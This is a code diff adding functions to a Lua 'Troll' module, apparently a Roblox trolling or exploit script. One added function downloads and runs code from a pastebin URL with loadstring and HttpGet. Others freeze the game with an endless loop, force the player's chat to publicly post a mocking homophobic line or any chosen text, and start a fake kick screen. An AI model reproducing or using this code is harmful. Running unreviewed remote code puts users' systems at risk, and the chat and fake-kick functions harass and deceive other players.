@@ -1,5 +1,21 @@
 local Troll = {}
-
+function Troll:NewRickroll()
+  loadstring(game:HttpGet("https://pastebin.com/raw/c4vRHDfj",true))()
+  return Troll
+end
+function Troll:RealCrash()
+  while true do 
+  end
+  return Troll
+end
+  function Troll:Gay()
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay and i love big men", "All")
+    return Troll
+end
+function Troll:Say(word)
+  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(word, "All")
+  return Troll
+end
 function Troll:Kick(msg,buttontxt,title)
 local FakeKick = Instance.new("ScreenGui")
 local promptOverlay = Instance.new("Frame")
